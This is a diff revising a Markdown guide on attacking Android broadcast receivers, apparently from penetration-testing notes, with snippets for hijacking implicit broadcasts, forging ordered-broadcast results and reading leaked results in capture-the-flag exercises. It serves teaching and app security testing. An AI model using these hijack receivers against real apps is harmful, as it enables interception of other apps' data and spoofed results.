@@ -47,22 +47,26 @@ registerReceiver(receiver, filter)
 
 In this case, if the system sends this broadcast intent, then the class `receiver` is used as the receiver and it'll execute the code in the `onReceive()` method.
 
-> **Note**: On Android 13 (API 33) and above, `registerReceiver()` requires explicitly declaring whether a dynamically registered broadcast receiver is exported when listening to unprotected broadcasts. This is done by supplying one of the following flags: `Context.RECEIVER_EXPORTED`, `Context.RECEIVER_NOT_EXPORTED`.
+> **Note**: Dynamically registered receivers used to be **exported by default**: any app could send them an unprotected broadcast, unless they were guarded by a signature permission. Android 13 (API 33) introduced the `Context.RECEIVER_EXPORTED` and `Context.RECEIVER_NOT_EXPORTED` flags, and apps targeting Android 14 (API 34) or higher must pass one of them, otherwise `registerReceiver()` throws a `SecurityException`. The only exception is a receiver registered exclusively for system broadcasts \[[↗](https://developer.android.com/about/versions/14/behavior-changes-14)].
 
 ### Send broadcasts
 
 Android provides two ways for apps to send broadcasts \[[↗](https://developer.android.com/develop/background-work/background-tasks/broadcasts#sending-broadcasts)]:
 
-* The `sendOrderedBroadcast()` method sends broadcasts to one receiver at a time. As each receiver executes in turn, **it can propagate a result to the next receiver**. It can also completely abort the broadcast so that it doesn't reach other receivers. You can control the order in which receivers run within the same app process. To do so, use the `android:priority` attribute of the matching `intent-filter`. Receivers with the same priority are run in an arbitrary order.
+* The `sendOrderedBroadcast()` method sends broadcasts to one receiver at a time. As each receiver executes in turn, **it can propagate a result to the next receiver**. It can also completely abort the broadcast so that it doesn't reach other receivers. You can control the order in which receivers run within the same app process. To do so, use the `android:priority` attribute of the matching `intent-filter`. Receivers with the same priority are run in an arbitrary order. Since Android 16, priority is only respected within the same process: across different apps the order is no longer guaranteed \[[↗](https://developer.android.com/about/versions/16/behavior-changes-all#ordered-broadcast-priority)].
 * The `sendBroadcast()` method sends broadcasts to all receivers in an undefined order. This is called a Normal Broadcast. This is more efficient, but means that **receivers cannot read results** from other receivers, propagate data received from the broadcast, or abort the broadcast.
 
 ### Broadcast limitations
 
-From Android 8 (API level 26) the delivery of implicit broadcasts to apps is [restricted](https://developer.android.com/about/versions/oreo/background#broadcasts). This is because the system generally wants to avoid broadcast receivers that could be called when the app is not even running. So you **have to specify the target**. As with any general rule, there are [exceptions](https://developer.android.com/develop/background-work/background-tasks/broadcasts/broadcast-exceptions) to this behavior. In fact, several broadcasts are exempt from these limitations.
+From Android 8 (API level 26), apps can no longer receive implicit broadcasts through receivers declared in their **manifest** \[[↗](https://developer.android.com/about/versions/oreo/background#broadcasts)]. The system wants to avoid waking up apps that are not even running. So, to reach a manifest-declared receiver, you **have to specify the target** (explicit broadcast).
+
+* This applies to apps targeting API 26 or higher.
+* **Dynamically registered receivers are not affected**: they still receive implicit broadcasts while the app is running.
+* Some broadcasts are [exempt](https://developer.android.com/develop/background-work/background-tasks/broadcasts/broadcast-exceptions), as are broadcasts that require a signature permission.
 
 ### System event broadcasts
 
-Android defines many [system broadcast actions](https://cs.android.com/android-studio/platform/tools/adt/idea/+/android12-release:android/testData/sdk1.5/platforms/android-1.5/data/broadcast_actions.txt), such as `BOOT_COMPLETED` and `POWER_CONNECTED`. Attempting to send a protected system broadcast fails with a `SecurityException`, for example: `permission denial: not allowed to send broadcast action POWER_CONNECTED`. This restriction applies to both implicit and explicit intents. Even when the target app and receiver class are specified explicitly, the system blocks the broadcast because only the system is allowed to send these actions. As a result, protected broadcast actions cannot be spoofed.
+Android defines many system broadcast actions, such as `BOOT_COMPLETED` and `ACTION_POWER_CONNECTED`, declared as `<protected-broadcast>` in the [framework manifest](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/res/AndroidManifest.xml). Attempting to send a protected broadcast from a non-system app fails with a `SecurityException`, for example: `Permission Denial: not allowed to send broadcast android.intent.action.ACTION_POWER_CONNECTED from pid=..., uid=...`. This restriction applies to both implicit and explicit intents. Even when the target app and receiver class are specified explicitly, the system blocks the broadcast because only the system is allowed to send these actions. As a result, protected broadcast actions cannot be spoofed.
 
 However, this does not automatically make the receiver safe. Since an attacker cannot set the protected action value, the receiver’s code cannot enter branches that explicitly check for it. If the receiver contains alternative code paths that do not validate the action, those paths may still be reachable through an explicit broadcast with a custom action.
 
@@ -78,9 +82,9 @@ sendBroadcast(intent);
 Target app:
 
 ```xml
-<receiver android:name:"com.app.test.TestReceiver" android:exported="true">
+<receiver android:name="com.app.test.TestReceiver" android:exported="true">
     <intent-filter>
-        <action android=name="android.intent.action.ACTION_POWER_CONNECTED"/>
+        <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
     </intent-filter>
 </receiver>
 ```
@@ -149,7 +153,7 @@ A broadcast redirect occurs when an insecure activity takes an incoming intent, 
 ```java
 public class ExposedActivity extends AppCompatActivity {
 
-    @override
+    @Override
     protected void onCreate (...) {
         ...
         Intent intent = getIntent();
@@ -164,17 +168,18 @@ For more information, refer to [Intent attack surface - Intent redirect](intent%
 
 ### Intercept implicit intents
 
-This is when the an app sends an implicit intent broadcast so a malicious app can register a receiver to be a valid target for the implicit intent.
+This is when an app sends an implicit broadcast, so a malicious app can register a receiver to be a valid target for it.
 
-1. Identify an app that sends implicit broadcast.
-2. Use the dynamic registered receivers in your activity. This means the app must be already running.
+1. Identify an app that sends an implicit broadcast.
+2. Register a receiver dynamically in your activity. This means your app must be already running.
 
 ```java
-BoradcastReceiver receiver = new hijackReceiver();
-registerReceiver(receiver, new IntentFilter("com.example.app.intent.SP_APPS_QUERY_FEEDS"))
+BroadcastReceiver receiver = new HijackReceiver();
+// RECEIVER_EXPORTED: required on Android 14+ to receive broadcasts from other apps
+registerReceiver(receiver, new IntentFilter("com.example.app.intent.SP_APPS_QUERY_FEEDS"), Context.RECEIVER_EXPORTED);
 ```
 
-> **Note**: if you create a new receiver in your app and expose this in the `AndroidManifest.xml`, it probably will not receive an implicit broadcast due to the battery impact of background tasks that we are talked about before.
+> **Note**: a receiver declared in your `AndroidManifest.xml` will not receive the implicit broadcast, because of the [Android 8 limitation](#broadcast-limitations) described above.
 
 **Example**
 
@@ -221,28 +226,30 @@ BroadcastReceiver hijackReceiver = new BroadcastReceiver() {
         setResultCode(RESULT_OK); // Costant value for -1. We add this to trigger success()
     }
 };
-registerReceiver(hijackReceiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"));
+registerReceiver(hijackReceiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"), Context.RECEIVER_EXPORTED);
 ```
 
 ### Control the results
 
-Similar to activities, a broadcast can return results back to the sender with `sendOrderedBroadcast()`. This method takes in another BroadcastReceiver object which will handle the result returned back.
-
-If a malicious app receives such a broadcast, they can return attacker controlled values.
+Similar to activities, a broadcast can return results back to the sender with `sendOrderedBroadcast()`. This method takes another BroadcastReceiver (the *result receiver*), which is called at the end with the final result (`resultCode`, `resultData`, `resultExtras`).
 
 ```java
 BroadcastReceiver resultReceiver = new BroadcastReceiver() {
-    @override
-    public void onReceive(Context context, Intent intet) {
+    @Override
+    public void onReceive(Context context, Intent intent) {
         String resultData = getResultData();
-        Bundle resultExtras = gerResultExtras(false);
+        Bundle resultExtras = getResultExtras(false);
         int resultCode = getResultCode();
-        // attacker controlled intent
     }
-}
+};
 
 sendOrderedBroadcast(intent, null, resultReceiver, null, RESULT_CANCELED, null, null);
 ```
+
+This works in both directions:
+
+* **The victim sends** the ordered broadcast: a malicious receiver can set attacker-controlled results with `setResultCode()`, `setResultData()` and `setResultExtras()`, which the victim then trusts (see [Intercept implicit intents](#intercept-implicit-intents)).
+* **The attacker sends** the ordered broadcast to the victim's receiver: the victim's results come back to the attacker's result receiver, possibly leaking data (example below).
 
 **Example**
 
@@ -286,7 +293,7 @@ public class Flag17Receiver extends BroadcastReceiver {
 }
 ```
 
-To intercept this intent I have to send a broadcast and analyze the results:
+To get the flag, send an ordered broadcast to the receiver and read the results:
 
 ```java
 Intent intent = new Intent();
